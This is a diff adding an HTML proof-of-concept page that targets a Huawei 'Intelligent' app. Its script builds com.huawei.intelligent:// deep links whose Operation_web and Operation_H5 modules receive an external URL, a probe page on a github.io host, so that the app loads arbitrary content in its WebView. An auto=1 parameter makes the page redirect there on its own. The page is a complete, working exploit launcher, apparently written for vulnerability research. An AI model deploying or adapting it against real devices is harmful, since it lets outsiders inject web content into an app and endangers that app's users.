@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Intelligent Router PoC Launcher</title>
+<style>
+body{font-family:sans-serif;margin:24px;background:#111;color:#eee}
+a,button{display:block;margin:16px 0;padding:14px;background:#238636;color:#fff;text-decoration:none;border:none;border-radius:8px;font-size:16px;text-align:center}
+.hint{color:#aaa;font-size:13px;line-height:1.6}
+</style>
+</head>
+<body>
+<h1>ModulesActivityRouterActivity PoC</h1>
+<p class="hint">Click to launch deep link from Huawei Browser (launchedFromUid = browser).</p>
+<a id="webLink" href="#">Operation_web → local probe</a>
+<a id="h5Link" href="#">Operation_H5 → local probe</a>
+<script>
+(function(){
+  var probe = 'https://lx866.github.io/poc/webview-js-probe.html';
+  var base = 'com.huawei.intelligent://multilevel.page/mainPage';
+  var web = base
+    + '?moduleId=Operation_web&url=' + encodeURIComponent(probe)
+    + '&title=' + encodeURIComponent('Browser PoC Probe');
+  var h5 = base
+    + '?moduleId=Operation_H5&url=' + encodeURIComponent(probe)
+    + '&title=' + encodeURIComponent('Browser H5 Probe');
+  document.getElementById('webLink').href = web;
+  document.getElementById('h5Link').href = h5;
+  if (/[?&]auto=1/.test(location.search)) {
+    document.body.insertAdjacentHTML('afterbegin',
+      '<p class="hint">auto=1: redirecting to Operation_web deep link…</p>');
+    setTimeout(function(){ location.href = web; }, 800);
+  }
+})();
+</script>
+</body>
+</html>
